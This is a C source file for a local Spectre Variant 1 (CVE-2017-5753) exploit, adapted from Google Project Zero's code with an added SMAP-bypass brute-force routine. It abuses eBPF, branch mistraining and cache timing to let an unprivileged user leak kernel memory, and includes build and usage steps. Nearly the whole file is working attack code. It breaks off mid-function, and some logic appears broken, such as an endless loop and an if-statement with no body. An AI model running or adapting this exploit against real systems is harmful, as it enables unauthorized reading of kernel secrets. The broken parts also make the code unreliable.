// Local exploit for CVE-2017-5753 (as known as Spectre Variant1, Bound Check Bypass)
// It's to read privileged kernel memory from unprivileged user. (non-root user)
// Tested on 4.4.0-62-generic #83-Ubuntu kernel. (Ubuntu 16.04), CPU - Intel(R) Core(TM) i7-6700 CPU @ 3.40GHz
// Tested environment includes SMEP, SMAP.
//
// Original exploit code against CVE-2017-5753 is from Google project zero team.
// (https://www.exploit-db.com/exploits/43427/)
// (https://googleprojectzero.blogspot.co.at/2018/01/reading-privileged-memory-with-side.html)
//
// Original exploit code doesn't have ability to bypass SMAP.
// So, I updated the exploit code to bypass SMAP.
// It is a kind of minor update, So, this exploit code is heavily similar to original's.
//
// Difference point from original's : 
// - get_leak_index_from_bruteforce() is added to bypass SMAP.
// - How to get leak_index??
//   (1) mlock user_leak_area_smap. ==> Allocate kernel page for that user memory. (kernel_leak_area)
//   (2) Do bruteforce to predict offset between kernel_leak_area and prog_map.
//
// Usage :
// $ gcc -pthread -o poc poc.c -Wall -ggdb -std=gnu99
// $ ./poc
// ....
// [] progress : [0][ffff880307fff000]
// .... (repeat to get leak_index) ....
// [] hit!! leak_index[0] : 620037f4  ==> offset to move from prog_map to kernel_leak_area
// ..... 
// [] 00001000  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|  ==> start to dump kernel
//
// Contact :  Jinbum Park <jinb.park7@gmail.com>
//

#define _GNU_SOURCE
#include <pthread.h>
#include <assert.h>
#include <err.h>
#include <stdint.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <asm/unistd_64.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <pthread.h>
#include <errno.h>
#include <limits.h>
#include <stdbool.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stddef.h>
#include <signal.h>
#include <string.h>
#include <ctype.h>
#include <sys/mman.h>
#include <sys/user.h>



#define KERNEL_4_4_NOLOCKDEP



#define GPLv2 "GPL v2"
#define ARRSIZE(x) (sizeof(x) / sizeof((x)[0]))



#define __aligned(x)    __attribute__((aligned(x)))
typedef struct { int counter; } atomic_t;
typedef struct { long __aligned(8) counter; } atomic64_t;
typedef atomic64_t atomic_long_t;
struct list_head {
  void *next, *prev;
};
struct work_struct {
  atomic_long_t data;
  struct list_head entry;
  void *func;
};
#if defined(KERNEL_4_11_NOLOCKDEP)
struct bpf_map {
  atomic_t refcnt;
  int map_type;
  int key_size;
  int value_size;
  int max_entries;
  int map_flags;
  int pages;
  void *user;
  void *ops;
  struct work_struct work;
  atomic_t usercnt;
};
#elif defined(KERNEL_4_4_NOLOCKDEP)
struct bpf_map {
  atomic_t refcnt;
  int map_type;
  int key_size;
  int value_size;
  int max_entries;
  int pages;
  void *user;
  void *ops;
  struct work_struct work;
  atomic_t usercnt;
};
#endif
struct bpf_array {
  struct bpf_map map;
  int elem_size;
  int owner_prog_type;
  bool owner_jited;
  char value[0] __aligned(8);
};
#define BPF_ARRAY_VALUE_OFFSET (offsetof(struct bpf_array, value))
struct bpf_prog {
  unsigned short  pages;          /* Number of allocated pages */
  unsigned short  jited:1,        /* Is our filter JIT'ed? */
                  locked:1,       /* Program image locked? */
                  gpl_compatible:1, /* Is filter GPL compatible? */
                  cb_access:1,    /* Is control block accessed? */
                  dst_needed:1,   /* Do we need dst entry? */
                  xdp_adjust_head:1; /* Adjusting pkt head? */
  int             type;           /* Type of BPF program */
  unsigned int    len;            /* Number of filter blocks */
  unsigned char   tag[8];
  void            *aux;           /* Auxiliary fields */
  void            *orig_prog;     /* Original BPF program */
  void            *bpf_func;
};

char user_leak_area_smap[4096] __attribute__((aligned(4096))) = {0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0xa0,};
unsigned long kernel_leak_area_smap = 0;

/* registers */
/* caller-saved: r0..r5 */
#define BPF_REG_ARG1    BPF_REG_1
#define BPF_REG_ARG2    BPF_REG_2
#define BPF_REG_ARG3    BPF_REG_3
#define BPF_REG_ARG4    BPF_REG_4
#define BPF_REG_ARG5    BPF_REG_5
#define BPF_REG_CTX     BPF_REG_6
#define BPF_REG_FP      BPF_REG_10

#define BPF_LD_IMM64_RAW(DST, SRC, IMM)         \
  ((struct bpf_insn) {                          \
    .code  = BPF_LD | BPF_DW | BPF_IMM,         \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = 0,                                 \
    .imm   = (__u32) (IMM) }),                  \
  ((struct bpf_insn) {                          \
    .code  = 0, /* zero is reserved opcode */   \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = ((__u64) (IMM)) >> 32 })
#define BPF_LD_MAP_FD(DST, MAP_FD)              \
  BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)
#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)        \
  ((struct bpf_insn) {                          \
    .code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,\
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = OFF,                               \
    .imm   = 0 })
#define BPF_MOV64_REG(DST, SRC)                 \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_MOV | BPF_X,       \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = 0,                                 \
    .imm   = 0 })
#define BPF_ALU64_IMM(OP, DST, IMM)             \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,    \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = IMM })
#define BPF_STX_MEM(SIZE, DST, SRC, OFF)        \
  ((struct bpf_insn) {                          \
    .code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,\
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = OFF,                               \
    .imm   = 0 })
#define BPF_ST_MEM(SIZE, DST, OFF, IMM)         \
  ((struct bpf_insn) {                          \
    .code  = BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = OFF,                               \
    .imm   = IMM })
#define BPF_EMIT_CALL(FUNC)                     \
  ((struct bpf_insn) {                          \
    .code  = BPF_JMP | BPF_CALL,                \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = (FUNC) })
#define BPF_JMP_IMM(OP, DST, IMM, OFF)          \
  ((struct bpf_insn) {                          \
    .code  = BPF_JMP | BPF_OP(OP) | BPF_K,      \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = OFF,                               \
    .imm   = IMM })
#define BPF_EXIT_INSN()                         \
  ((struct bpf_insn) {                          \
    .code  = BPF_JMP | BPF_EXIT,                \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = 0 })
#define BPF_LD_ABS(SIZE, IMM)                   \
  ((struct bpf_insn) {                          \
    .code  = BPF_LD | BPF_SIZE(SIZE) | BPF_ABS, \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = IMM })
#define BPF_ALU64_REG(OP, DST, SRC)             \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_OP(OP) | BPF_X,    \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = 0,                                 \
    .imm   = 0 })
#define BPF_MOV64_IMM(DST, IMM)                 \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_MOV | BPF_K,       \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = IMM })

/* this should jump forward in the error case so that the static branch prediction
 * goes the right way (if we hit the static branch prediction for some reason)
 */
#define BPF_GOTO_EXIT_IF_R0_NULL                \
  BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 0x7ff)


int bpf_(int cmd, union bpf_attr *attrs) {
  return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs));
}

int array_create(int value_size, int num_entries) {
  union bpf_attr create_map_attrs = {
      .map_type = BPF_MAP_TYPE_ARRAY,
      .key_size = 4,
      .value_size = value_size,
      .max_entries = num_entries
  };
  int mapfd = bpf_(BPF_MAP_CREATE, &create_map_attrs);
  return mapfd;
}

int prog_load(struct bpf_insn *insns, size_t insns_count) {
  char verifier_log[100000];
  union bpf_attr create_prog_attrs = {
    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
    .insn_cnt = insns_count,
    .insns = (uint64_t)insns,
    .license = (uint64_t)GPLv2,
    .log_level = 1,
    .log_size = sizeof(verifier_log),
    .log_buf = (uint64_t)verifier_log
  };
  int progfd = bpf_(BPF_PROG_LOAD, &create_prog_attrs);
  int errno_ = errno;
  
  errno = errno_;
  if (progfd == -1)
    return -1;
  return progfd;
}

int create_filtered_socket_fd(struct bpf_insn *insns, size_t insns_count) {
  int progfd = prog_load(insns, insns_count);

  // hook eBPF program up to a socket
  // sendmsg() to the socket will trigger the filter
  // returning 0 in the filter should toss the packet
  int socks[2];
  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))
    return -1;
  if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(int)))
    return -1;
  return socks[1];
}

void user_flush_cacheline(void *arg) {
  asm volatile(
    "mov $0, %%eax\n\t"
    "cpuid\n\t" /* pleeeease don't do this speculatively :/ */
    "clflush %0"
  : "+m" (*(volatile char *)arg)
  : /* no inputs */
  : "ax", "bx", "cx", "dx");
}

int user_timed_reload(void *arg) {
  int tsc1, tsc2, read_copy;
  asm volatile(
    "mov $0, %%eax\n\t"
    "cpuid\n\t" /* serialize; clobbers eax, ebx, ecx, edx */
    "rdtscp\n\t" /* counter into eax; clobbers edx, ecx */
    "mov %%eax, %0\n\t"
    "mov (%3), %%eax\n\t"
    "mov %%eax, %2\n\t"
    "rdtscp\n\t" /* counter into eax; clobbers edx, ecx */
    "mov %%eax, %1\n\t"
  : "=&r"(tsc1), "=&r"(tsc2), "=&r"(read_copy)
  : "r"((unsigned int *)arg)
  : "ax", "bx", "cx", "dx");
  return tsc2 - tsc1;
}

/* assumes 32-bit values */
void array_set(int mapfd, uint32_t key, uint32_t value) {
  union bpf_attr attr = {
    .map_fd = mapfd,
    .key    = (uint64_t)&key,
    .value  = (uint64_t)&value,
    .flags  = BPF_ANY,
  };

  int res = bpf_(BPF_MAP_UPDATE_ELEM, &attr);

}

void array_set_dw(int mapfd, uint32_t key, uint64_t value) {
  union bpf_attr attr = {
    .map_fd = mapfd,
    .key    = (uint64_t)&key,
    .value  = (uint64_t)&value,
    .flags  = BPF_ANY,
  };

  int res = bpf_(BPF_MAP_UPDATE_ELEM, &attr);

}

/* assumes 32-bit values */
uint32_t array_get(int mapfd, uint32_t key) {
  uint32_t value = 0;
  union bpf_attr attr = {
    .map_fd = mapfd,
    .key    = (uint64_t)&key,
    .value  = (uint64_t)&value,
    .flags  = BPF_ANY,
  };
  int res = bpf_(BPF_MAP_LOOKUP_ELEM, &attr);

  return value;
}

struct array_timed_reader_prog {
  int control_array;
  int sockfd;
};

struct array_timed_reader_prog create_timed_reader_prog(int timed_array_fd) {
  struct array_timed_reader_prog ret;

  /*
   * slot 0: timed_array index
   * slot 1: measured time delta
   */
  ret.control_array = array_create(4, 2);

  struct bpf_insn insns[] = {
    /*
     * setup: get pointer to timed_array slot
     * r7 = &timed_array[control_array[0]]
     */
    BPF_LD_MAP_FD(BPF_REG_ARG1, ret.control_array),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 0),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
    BPF_EXIT_INSN(),
    BPF_LDX_MEM(BPF_W, BPF_REG_0, BPF_REG_0, 0),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_STX_MEM(BPF_W, BPF_REG_ARG2, BPF_REG_0, 0),
    BPF_LD_MAP_FD(BPF_REG_ARG1, timed_array_fd),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
    BPF_EXIT_INSN(),
    BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),

    /* lfence and get time */
    BPF_EMIT_CALL(BPF_FUNC_ktime_get_ns),
    BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),

    /* do the actual load */
    BPF_LDX_MEM(BPF_B, BPF_REG_7, BPF_REG_7, 0),

    /*
     * lfence and get time delta
     * r6 = ktime_get_ns() - r6
     */
    BPF_EMIT_CALL(BPF_FUNC_ktime_get_ns),
    BPF_ALU64_REG(BPF_SUB, BPF_REG_0, BPF_REG_6),
    BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),

    /* store time delta */
    BPF_LD_MAP_FD(BPF_REG_ARG1, ret.control_array),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 1),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
    BPF_EXIT_INSN(),
    BPF_STX_MEM(BPF_W, BPF_REG_0, BPF_REG_6, 0),

    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN()
  };

  ret.sockfd = create_filtered_socket_fd(insns, ARRSIZE(insns));
  return ret;
}

void trigger_proc(int sockfd) {
  if (write(sockfd, "X", 1) != 1)
    return ;
}

uint32_t perform_timed_read(struct array_timed_reader_prog *prog, int index) {
  array_set(prog->control_array, 0, index);
  array_set(prog->control_array, 1, 0x13371337); /* poison, for error detection */
  trigger_proc(prog->sockfd);
  uint32_t res = array_get(prog->control_array, 1);
  if (res == 0x13371337)
    return -1;
  return res;
}

void exit_fixup(struct bpf_insn *insns, size_t arrsize) {
  int exit_idx = arrsize - 1;
  for (int i=0; i<arrsize; i++) {
    if (insns[i].code == (BPF_JMP | BPF_OP(BPF_JEQ) | BPF_K) && insns[i].off == 0x7ff) {
      insns[i].off = exit_idx - i - 1;
    }
  }
}

#define PAGE_SIZE_LOG2 (12)
#define FP_PAGES_PER_VMA_LOG2 (4)
#define FP_PAGES_PER_VMA (1UL<<FP_PAGES_PER_VMA_LOG2)
#define FP_VMA_COUNT_LOG2 (15)
#define FP_VMA_COUNT (1UL<<FP_VMA_COUNT_LOG2)

#define FP_MAPPING_SIZE (PAGE_SIZE * FP_PAGES_PER_VMA)  // 16 pages == 64 kb == 2^16
#define FP_SPAM_AREA_SIZE (FP_MAPPING_SIZE * FP_VMA_COUNT)  // 2^16 * 2^15 == 2^31
// 

// 1 means "bounce it", -1 means "exit now"
volatile int cacheline_bounce_status;
int cacheline_bounce_fds[2];
void *cacheline_bounce_worker(void *arg) {
  // pin to core 3
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(3, &set);
  if (sched_setaffinity(0, sizeof(cpu_set_t), &set))
    return NULL;

  while (1) {
    __sync_synchronize();
    int cacheline_bounce_status_copy;
    while ((cacheline_bounce_status_copy = cacheline_bounce_status) == 0) /* loop */;
    if (cacheline_bounce_status_copy == -1)
      return NULL;
    __sync_synchronize();

    struct bpf_insn insns[] = {
      BPF_LD_MAP_FD(BPF_REG_0, cacheline_bounce_fds[0]),
      BPF_LD_MAP_FD(BPF_REG_0, cacheline_bounce_fds[1]),
      BPF_LD_MAP_FD(BPF_REG_0, 0xffffff)
    };
    union bpf_attr attr = {
      .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
      .insn_cnt = ARRSIZE(insns),
      .insns = (__aligned_u64) insns,
      .license = (__aligned_u64)GPLv2
    };
    if (bpf_(BPF_PROG_LOAD, &attr) != -1 || errno != EBADF)
      return NULL;

    __sync_synchronize();
    cacheline_bounce_status = 0;
    __sync_synchronize();
  }
}
void bounce_cacheline(int fd) {
  cacheline_bounce_fds[0] = fd;
  cacheline_bounce_fds[1] = fd;
  __sync_synchronize();
  cacheline_bounce_status = 1;
  __sync_synchronize();
  while (cacheline_bounce_status != 0) __sync_synchronize();
  __sync_synchronize();
}
void bounce_two_cachelines(int fd1, int fd2) {
  cacheline_bounce_fds[0] = fd1;
  cacheline_bounce_fds[1] = fd2;
  __sync_synchronize();
  cacheline_bounce_status = 1;
  __sync_synchronize();
  while (cacheline_bounce_status != 0) __sync_synchronize();
  __sync_synchronize();
}
pthread_t cacheline_bounce_thread;
void cacheline_bounce_worker_enable(void) {
  cacheline_bounce_status = 0;
  if (pthread_create(&cacheline_bounce_thread, NULL, cacheline_bounce_worker, NULL))
    return;
}
void cacheline_bounce_worker_disable(void) {
  cacheline_bounce_status = -1;
  if (pthread_join(cacheline_bounce_thread, NULL))
    return;
}

// assumes that prog_map is an FD referencing an eBPF program
// array with a reference to a program that simply returns zero
// in its first slot.
unsigned long get_prog_map_addr(int prog_map) {
  // allocate virtual address space
  char *area = mmap(NULL, FP_SPAM_AREA_SIZE, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_NORESERVE, -1, 0);
  if (area == MAP_FAILED)
    return -1;
  munmap(area, FP_SPAM_AREA_SIZE);

  // create tmpfile
  int fd = open("/tmp", O_TMPFILE|O_RDWR, 0600);
  if (fd == -1)
    return -1;
  if (ftruncate(fd, FP_MAPPING_SIZE + PAGE_SIZE)) // FP_MAPPING_SIZE == Pages in a VMA, One VMA size
    return -1;

  // create VMAs and fault them in
  for (char *addr = area; addr < area + FP_SPAM_AREA_SIZE; addr += FP_MAPPING_SIZE) {
    if (mmap(addr, FP_MAPPING_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED|MAP_POPULATE|MAP_NORESERVE, fd, 0) != addr)
      return -1;
  }

  // create VMAs in an anti-stride-detection pattern
  // 15 prime intervals: 
  unsigned long prime_intervals[] = {
    2,3,5,7, 11,13,17,19, 23,29,31,37, 41,43,47
  };
  char *prime_mappings[FP_PAGES_PER_VMA];
  assert(sizeof(prime_intervals)/sizeof(prime_intervals[0]) == FP_PAGES_PER_VMA-1);
  unsigned long prime_mapping_area_pages = 1/*first page*/ + 20/*safety padding*/;
  for (unsigned long i=0; i<FP_PAGES_PER_VMA-1; i++) prime_mapping_area_pages += prime_intervals[i];
  char *pmap_area = mmap(NULL, PAGE_SIZE * prime_mapping_area_pages, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_NORESERVE, -1, 0);
  if (pmap_area == MAP_FAILED)
    return -1;
  char *pmap_area_ptr = pmap_area + PAGE_SIZE * 10; /* safety padding */
  for (unsigned long i=0; i<FP_PAGES_PER_VMA; i++) {
    prime_mappings[i] = pmap_area_ptr;
    char *mmap_res = mmap(prime_mappings[i], PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED|MAP_POPULATE|MAP_NORESERVE, fd, i * PAGE_SIZE);
    if (mmap_res != prime_mappings[i])
      return -1;
    pmap_area_ptr += PAGE_SIZE * prime_intervals[i];
  }

  int data_map = array_create(8, 2);

  struct bpf_insn finder_insns[] = {
    // save context for tail call
    BPF_MOV64_REG(BPF_REG_6, BPF_REG_ARG1),

    // r3 = prog_array_base_offset = *map_lookup_elem(data_map, &1)
    BPF_LD_MAP_FD(BPF_REG_ARG1, data_map),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 1),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_GOTO_EXIT_IF_R0_NULL,
    BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_0, 0),

    BPF_LD_MAP_FD(BPF_REG_ARG2, prog_map),
    BPF_MOV64_REG(BPF_REG_ARG1, BPF_REG_6),

    BPF_EMIT_CALL(BPF_FUNC_tail_call),

    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN()
  };
  exit_fixup(finder_insns, ARRSIZE(finder_insns));

  
  int sockfd = create_filtered_socket_fd(finder_insns, ARRSIZE(finder_insns));
  

  cacheline_bounce_worker_enable();

  bool found_high_low_order = false;
  bool conflicting_high_low_order = false;
  unsigned long high_low_order_success_addr = 0;

  /* prog_map address :  17bit fixed address (0xffff88) -- (1st) 16bit bruteforced high part -- (2nd) 15bits bitsected -- (1st) 4 bits hot physical page -- 12 bits page-aligned SLAB alignment */
  /* 1st :  Predict 16bit bruteforced high part */
  /* What does "16bit bruteforced high part" means? Try to predict for each 2GB offset. */
  /* Why? For reliable prediction;  */
  while (1) {
    for (unsigned long high_order_guess = 0xffff880000000000; high_order_guess >= 0xffff880000000000; high_order_guess += FP_SPAM_AREA_SIZE) {
      for (int mislead_i = 0; mislead_i < 33; mislead_i++) {
        if ((mislead_i&7) != 7) {
          array_set_dw(data_map, 1, 0); // execute instaquit program ;  execute quite program with normal offset.  mistraining conditional branch!!
        } else {  // execute wrong index.
          array_set_dw(data_map, 1, ((unsigned long)area - (high_order_guess + BPF_ARRAY_VALUE_OFFSET)) / 8);

			// flush probing memory in user space
          for (unsigned long in_vma_offset=0; in_vma_offset<FP_PAGES_PER_VMA; in_vma_offset++) {
            user_flush_cacheline(prime_mappings[in_vma_offset]);
          }

			// bounce cacheline of prog_map in kernel space
			// we can't flush prog_map as like prime_mappings, so alternative approach is bouncing cache line.
          bounce_cacheline(prog_map);
        }
        trigger_proc(sockfd);  // run eBPF program!! 
        if ((mislead_i&7) == 7) {  // If speculative execution triggered,
          for (unsigned long in_vma_offset=0; in_vma_offset<FP_PAGES_PER_VMA; in_vma_offset++) {
            int reload_time = user_timed_reload(prime_mappings[in_vma_offset]);
            if (reload_time < 100) {
              unsigned long curr_addr = high_order_guess | (in_vma_offset * PAGE_SIZE);
              
              if (!found_high_low_order) {
                high_low_order_success_addr = curr_addr;
                found_high_low_order = true;
              } else if (high_low_order_success_addr != curr_addr) {
                conflicting_high_low_order = true;
              }
            }
          }
        }
      }
    }
    found_high_low_order = false;
    conflicting_high_low_order = false;
  }
  /* clean up a bit */
  munmap(area, FP_SPAM_AREA_SIZE);

  /* 2nd :  Predict 15bits bitsected */
  /* Leverage quick-search approach */
  /*  */
  
  unsigned long leaked_addr = high_low_order_success_addr;
  for (
          int middle_bit_idx = PAGE_SIZE_LOG2+FP_PAGES_PER_VMA_LOG2+FP_VMA_COUNT_LOG2-1;
          middle_bit_idx >= PAGE_SIZE_LOG2+FP_PAGES_PER_VMA_LOG2;
          middle_bit_idx--) {
    
    area = mmap(NULL, (1UL<<(middle_bit_idx+1)) + FP_MAPPING_SIZE, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_NORESERVE, -1, 0);
    if (area == MAP_FAILED)
      return -1;
    for (char *addr = area; addr < area + (1UL<<(middle_bit_idx+1)); addr += FP_MAPPING_SIZE) {
      unsigned long file_off = (addr-area) < (1UL<<middle_bit_idx) ? 0 : 0x1000;
      /* maps more than needed to avoid needing PROT_NONE VMAs to prevent libc allocs in the same area.
       * PROT_NONE VMAs count towards the VMA limit (2^16), so they're bad for us.
       * if this turns out to be problematic for some reason, could fix it up
       * by using some region libc won't use or whatever.
       */
      char *mmap_res = mmap(addr, FP_MAPPING_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED|MAP_POPULATE|MAP_NORESERVE, fd, file_off);
      if (mmap_res != addr)
        return -1;
    }

    int votes_0 = 0, votes_1 = 0;
    int errors00 = 0, errors11 = 0;
    for (int mislead_i = 0; mislead_i < 65; mislead_i++) {
      if ((mislead_i&7) != 7) {
        array_set_dw(data_map, 1, 0); // execute instaquit program
      } else {
        array_set_dw(data_map, 1, ((unsigned long)area - (leaked_addr + BPF_ARRAY_VALUE_OFFSET)) / 8);

        user_flush_cacheline(prime_mappings[0]);
        user_flush_cacheline(prime_mappings[1]);

        bounce_cacheline(prog_map);
      }
      trigger_proc(sockfd);
      if ((mislead_i&7) == 7) {
        int reload_time_0 = user_timed_reload(prime_mappings[0]);
        int reload_time_1 = user_timed_reload(prime_mappings[1]);
        bool cached_0 = (reload_time_0 < 100);
        bool cached_1 = (reload_time_1 < 100);
        if (cached_0 && !cached_1)
          votes_0++;
        if (!cached_0 && cached_1)
          votes_1++;
        if (!cached_0 && !cached_1)
          errors00++;
        if (cached_0 && cached_1)
          errors11++;
      }
    }

    munmap(area, (1UL<<(middle_bit_idx+1)) + FP_MAPPING_SIZE);

    int decided_bit = (votes_0 > votes_1) ? 0 : 1;
    unsigned long addr_mixin = decided_bit ? (1UL<<middle_bit_idx) : 0;
    leaked_addr |= addr_mixin;

    if (votes_0 + votes_1 < 3)
      return -1;
  }

  cacheline_bounce_worker_disable();
  munmap(pmap_area, PAGE_SIZE * prime_mapping_area_pages);
  close(fd);

  
  return leaked_addr;
}

struct info_arg {
    int fd;
    unsigned long map_addr;
};

unsigned long get_prog_map_addr_from_lkm(int prog_map) {
	int fd, r;
	struct info_arg iarg;

	fd = open("/proc/info", O_RDWR, S_IXUSR | S_IROTH);
	if (fd < 0) {
		
		return -1;
	}

	iarg.fd = prog_map;
	iarg.map_addr = 0;
	r = ioctl(fd, 0, &iarg);
	if (r)
		
	
	close(fd);
	
	return iarg.map_addr;
}

struct mem_leaker_prog {
  int victim_map;
  int data_map;
  int prog_map;

  int sockfd;

  unsigned long kernel_leak_area_index;
};

static int create_finder_insn(int data_map, int prog_map)
{
	struct bpf_insn finder_insns[] = {
    // save context for tail call
    BPF_MOV64_REG(BPF_REG_6, BPF_REG_ARG1),

    // r3 = prog_array_base_offset = *map_lookup_elem(data_map, &1)
    BPF_LD_MAP_FD(BPF_REG_ARG1, data_map),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 1),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_GOTO_EXIT_IF_R0_NULL,
    BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_0, 0),

    BPF_LD_MAP_FD(BPF_REG_ARG2, prog_map),
    BPF_MOV64_REG(BPF_REG_ARG1, BPF_REG_6),

    BPF_EMIT_CALL(BPF_FUNC_tail_call),

    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN()
  };
  exit_fixup(finder_insns, ARRSIZE(finder_insns));

  
  int sockfd = create_filtered_socket_fd(finder_insns, ARRSIZE(finder_insns));
  

  cacheline_bounce_worker_enable();
  return sockfd;
}

/* get_leak_index_from_bruteforce() */
static unsigned long get_leak_index_from_bruteforce(int prog_map)
{
	unsigned long base_area = 0xffff880000000000UL;	/* depends on kernel version, It's for 4.4-generic-62 */
	unsigned long cand_start[2] = {0xffff880300000000UL, 0xffff880000000000UL};
	unsigned long cand_end[2] = {0xffff8803fffff000UL, 0xffff8800fffff000UL};
	unsigned long cand;
	unsigned long leak_offset = 0x00UL;
	unsigned long leak_index[2];
	unsigned long progress = 0;
	int i, j;
	int mislead_i;
	int sockfd;

	if (mlock(user_leak_area_smap, sizeof(user_leak_area_smap)) != 0) {
		
		return -1;
	}
	

	int data_map = array_create(8, 2);
	sockfd = create_finder_insn(data_map, prog_map);

	for (i=0; i<2; i++) {
		for (cand=cand_start[i]; cand<cand_end[i]; cand+=4096) {
			leak_offset = cand - base_area;
			leak_index[0] = ((leak_offset + BPF_ARRAY_VALUE_OFFSET) / 8) - 0x18;

			leak_offset = base_area - cand;
			leak_index[1] = ((leak_offset + BPF_ARRAY_VALUE_OFFSET) / 8) - 0x18;

			for (j=0; j<2; j++) {
				for (mislead_i = 0; mislead_i < 33; mislead_i++) {
					if ((mislead_i&7) != 7) {
					  array_set_dw(data_map, 1, 0); // execute instaquit program ;  execute quite program with normal offset.  mistraining conditional branch!!
					} else {  // execute wrong index.
					  array_set_dw(data_map, 1, leak_index[j]);

					  // flush probing memory in user space
					  user_flush_cacheline(user_leak_area_smap);

						// bounce cacheline of prog_map in kernel space
						// we can't flush prog_map as like prime_mappings, so alternative approach is bouncing cache line.
					  bounce_cacheline(prog_map);
					}

					trigger_proc(sockfd);  // run eBPF program!! 
					if ((mislead_i&7) == 7) {  // If speculative execution triggered,
						int reload_time = user_timed_reload(user_leak_area_smap);
						if (reload_time < 100) {
							
							return leak_index[j];
						}
					}
				}
			}

			progress++;
			if ((progress % (1<<15)) == 0) {
				continue;
			}
		}
	}

	return 0;
}

struct mem_leaker_prog load_mem_leaker_prog(void) {
  struct mem_leaker_prog ret;

  union bpf_attr create_prog_map_attrs = {
    .map_type = BPF_MAP_TYPE_PROG_ARRAY,
    .key_size = 4,
    .value_size = 4,
    .max_entries = 2048/8 + 1 /* kmalloc-4096 slab for fixed in-page alignment */
  };
  ret.prog_map = bpf_(BPF_MAP_CREATE, &create_prog_map_attrs);

  struct bpf_insn quitter_insns[] = {
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN()
  };
  int quitter_prog = prog_load(quitter_insns, ARRSIZE(quitter_insns));
  array_set(ret.prog_map, 0, quitter_prog);

  ret.kernel_leak_area_index = get_leak_index_from_bruteforce(ret.prog_map);


  ret.victim_map = array_create(8, 5/*whatever*/);

